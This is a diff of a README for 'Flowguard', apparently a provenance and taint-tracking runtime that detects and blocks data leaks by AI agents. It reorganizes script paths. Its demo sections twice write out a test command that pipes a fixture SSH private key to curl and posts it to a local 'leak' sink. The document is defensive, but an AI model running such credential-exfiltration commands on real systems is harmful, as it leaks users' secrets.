@@ -1,10 +1,15 @@
-# Syscall Provenance Engine for AI Agent Security
+# Flowguard
 
 ## Overview
 
-This project implements a **runtime provenance tracking system** that observes execution events and reconstructs **dataflow at the syscall boundary**.
+This project implements a **provenance-aware security runtime** for AI agents.
 
-The goal is to detect and explain unsafe behavior in AI agents and automated systems.
+Flowguard has two implementation layers:
+
+- `runtimes/python-taint`: precise Python dynamic taint tracking for agent tools, generated code, and supported IO boundaries
+- `crates/system-provenance`: Rust syscall/process provenance for conservative sandbox fallback, replay, graph construction, policy decisions, and explanations
+
+The goal is to detect, block, and explain unsafe data movement in AI agents and automated systems.
 
 ---
 
@@ -67,7 +72,7 @@ SECRET → NETWORK
 This is the fastest public demo of the Python dynamic taint runtime:
 
 ```sh
-bash scripts/run_python_mvp_poc.sh
+bash runtimes/python-taint/scripts/run_python_mvp_poc.sh
 ```
 
 The script runs three generated-code cases:
@@ -140,8 +145,8 @@ Current limitations:
 Useful overrides:
 
 ```sh
-FLOWGUARD_POC_OUT_DIR=/tmp/flowguard bash scripts/run_python_mvp_poc.sh
-FLOWGUARD_POC_NAME=my-review bash scripts/run_python_mvp_poc.sh
+FLOWGUARD_POC_OUT_DIR=/tmp/flowguard bash runtimes/python-taint/scripts/run_python_mvp_poc.sh
+FLOWGUARD_POC_NAME=my-review bash runtimes/python-taint/scripts/run_python_mvp_poc.sh
 ```
 
 ## Reproduce The Live OpenAI Agent Demo
@@ -155,7 +160,7 @@ Install the optional SDK and run the demo:
 
 ```sh
 python3 -m pip install openai-agents
-OPENAI_API_KEY=... bash scripts/run_openai_live_agent_leak_demo.sh
+OPENAI_API_KEY=... bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
 ```
 
 Expected terminal summary:
@@ -183,9 +188,9 @@ Useful fields to inspect:
 Useful overrides:
 
 ```sh
-FLOWGUARD_AGENT_MODEL=gpt-5-nano bash scripts/run_openai_live_agent_leak_demo.sh
-FLOWGUARD_AGENT_OUT_DIR=/tmp/flowguard bash scripts/run_openai_live_agent_leak_demo.sh
-FLOWGUARD_AGENT_NAME=my-live-review bash scripts/run_openai_live_agent_leak_demo.sh
+FLOWGUARD_AGENT_MODEL=gpt-5-nano bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
+FLOWGUARD_AGENT_OUT_DIR=/tmp/flowguard bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
+FLOWGUARD_AGENT_NAME=my-live-review bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
 ```
 
 The OpenAI SDK is intentionally optional. The core Flowguard Python runtime does
@@ -206,7 +211,7 @@ Flowguard observes the syscalls with `strace`, builds the provenance graph, bloc
 Run the full POC regression with one command:
 
 ```sh
-bash scripts/run_observe_poc.sh
+bash crates/system-provenance/scripts/run_observe_poc.sh
 ```
 
 The script:
@@ -224,10 +229,10 @@ The script:
 Useful environment overrides:
 
 ```sh
-FLOWGUARD_SKIP_DOCKER_BUILD=1 bash scripts/run_observe_poc.sh
-FLOWGUARD_POC_NAME=my-run bash scripts/run_observe_poc.sh
-FLOWGUARD_POC_PORT=18000 bash scripts/run_observe_poc.sh
-FLOWGUARD_DOCKER_EXTRA_ARGS='--add-host=host.docker.internal:host-gateway' bash scripts/run_observe_poc.sh
+FLOWGUARD_SKIP_DOCKER_BUILD=1 bash crates/system-provenance/scripts/run_observe_poc.sh
+FLOWGUARD_POC_NAME=my-run bash crates/system-provenance/scripts/run_observe_poc.sh
+FLOWGUARD_POC_PORT=18000 bash crates/system-provenance/scripts/run_observe_poc.sh
+FLOWGUARD_DOCKER_EXTRA_ARGS='--add-host=host.docker.internal:host-gateway' bash crates/system-provenance/scripts/run_observe_poc.sh
 ```
 
 ### Validation Commands
@@ -238,10 +243,16 @@ Use the fast Rust suite for normal development:
 cargo test
 ```
 
+Use the Python runtime suite for Python taint changes:
+
+```sh
+PYTHONPATH=runtimes/python-taint/src PYTHONWARNINGS=error python3 -m unittest discover -s runtimes/python-taint/tests
+```
+
 Use the Docker-backed POC regression before demo changes or observer changes:
 
 ```sh
-bash scripts/run_observe_poc.sh
+bash crates/system-provenance/scripts/run_observe_poc.sh
 ```
 
 The Docker regression is intentionally not part of `cargo test` because it requires Docker, host networking to a local POST sink, and `strace` inside the observer image.
@@ -251,7 +262,7 @@ The Docker regression is intentionally not part of `cargo test` because it requi
 #### 1. Build The Observer Image
 
 ```sh
-docker build -f docker/observer.Dockerfile -t flowguard-observer .
+docker build -f crates/system-provenance/docker/observer.Dockerfile -t flowguard-observer .
 ```
 
 #### 2. Start A Local POST Sink
@@ -287,10 +298,10 @@ mkdir -p logs
 
 docker run --rm \
   -v "$PWD:/work" \
-  -v "$PWD/fixtures/home:/home/user:ro" \
+  -v "$PWD/crates/system-provenance/fixtures/home:/home/user:ro" \
   -w /work \
   flowguard-observer \
-  cargo run -- observe --json \
+  cargo run --manifest-path crates/system-provenance/Cargo.toml -- observe --json \
     --raw-strace logs/secret-to-network.raw.strace \
     -- sh -c 'cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak' \
   > logs/secret-to-network.report.json
@@ -307,7 +318,7 @@ On Linux, if `host.docker.internal` is not available, add this to the `docker ru
 #### 4. Dump The Violation Log And Graph
 
 ```sh
-python3 scripts/dump_observe_report.py \
+python3 crates/system-provenance/scripts/dump_observe_report.py \
   logs/secret-to-network.report.json \
   --out-dir logs \
   --name secret-to-network
@@ -343,7 +354,7 @@ The `protect` command is the runtime-blocking POC. It runs the same leak under a
 Run:
 
 ```sh
-bash scripts/run_protect_poc.sh
+bash crates/system-provenance/scripts/run_protect_poc.sh
 ```
 
 The script:
@@ -363,9 +374,9 @@ The Docker run uses `--cap-add=SYS_PTRACE` and `--security-opt seccomp=unconfine
 Useful overrides:
 
 ```sh
-FLOWGUARD_PROTECT_IMAGE=flowguard-observer bash scripts/run_protect_poc.sh
-FLOWGUARD_DOCKER_PLATFORM=linux/amd64 bash scripts/run_protect_poc.sh
-FLOWGUARD_DOCKER_PLATFORM=linux/arm64 bash scripts/run_protect_poc.sh
+FLOWGUARD_PROTECT_IMAGE=flowguard-observer bash crates/system-provenance/scripts/run_protect_poc.sh
+FLOWGUARD_DOCKER_PLATFORM=linux/amd64 bash crates/system-provenance/scripts/run_protect_poc.sh
+FLOWGUARD_DOCKER_PLATFORM=linux/arm64 bash crates/system-provenance/scripts/run_protect_poc.sh
 ```
 
 Manual command shape:
@@ -375,10 +386,10 @@ docker run --rm --platform linux/amd64 \
   --cap-add=SYS_PTRACE \
   --security-opt seccomp=unconfined \
   -v "$PWD:/work" \
-  -v "$PWD/fixtures/home:/home/user:ro" \
+  -v "$PWD/crates/system-provenance/fixtures/home:/home/user:ro" \
   -w /work \
   flowguard-observer \
-  cargo run -- protect --json \
+  cargo run --manifest-path crates/system-provenance/Cargo.toml -- protect --json \
     -- sh -c 'cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak'
 ```
 
